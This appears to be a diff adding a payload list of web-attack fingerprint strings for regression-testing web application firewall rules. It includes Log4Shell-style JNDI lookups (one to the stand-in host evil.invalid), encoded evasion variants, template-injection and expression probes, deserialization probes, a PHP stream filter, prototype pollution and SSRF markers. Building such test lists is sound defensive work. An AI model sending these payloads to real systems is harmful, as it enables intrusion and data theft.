@@ -1,0 +1,35 @@
+# CVE-class WAAP fingerprint strings — authorized targets only (labs / contracted assessments).
+# These are intentionally incomplete/non-operative against most stacks: they mimic public,
+# CNA-documented patterns so defensive controls can be regression-tested WITHOUT shipping full exploits.
+
+# CWE-917 / CWE-502 — expression & lookup primitives (often tied to CVE-2021-44228 class coverage)
+${jndi:ldap://127.0.0.1#}
+${jndi:ldap://127.0.0.1:1389/obj}
+${jndi:rmi://127.0.0.1:1099/exp}
+${jndi:dns://evil.invalid/exp}
+$$%24%257bjndi%3Aldap%3A/
+%2524%25257bjndi%25253Aldap%25253A/
+
+# CVE-2022-42889 pattern family (Apache Commons Text lookup tokens — signature only)
+${dns:address|evil.invalid}
+
+# Spring expression / MVC misconfiguration classes (opaque fragments; not chained gadgets)
+%{@java.lang.Math@random()}
+__${7*7}__::__.x
+
+# JSON type confusion probes seen in deserialization/WAF regressions (no gadget payload)
+{"@type":"java.lang.Void","x":42}
+[["java.lang.Long", 1]]
+
+# SSTI-ish template tokens used in modern scanners (evaluation disabled on server ideally)
+<%= 7 * 7 %>
+{{7*'7'}}
+
+# PHP stream filter class (overlap with traversal rules)
+php://filter/convert.base64-encode/resource=data://text/plain,AA
+
+# Prototype confusion marker string (modern JS SSR surfaces)
+constructor[prototype][polluted]=1
+
+SSRF-marker-http://evil.invalid/metadata
+SSRF-marker-gopher://evil.invalid:_/
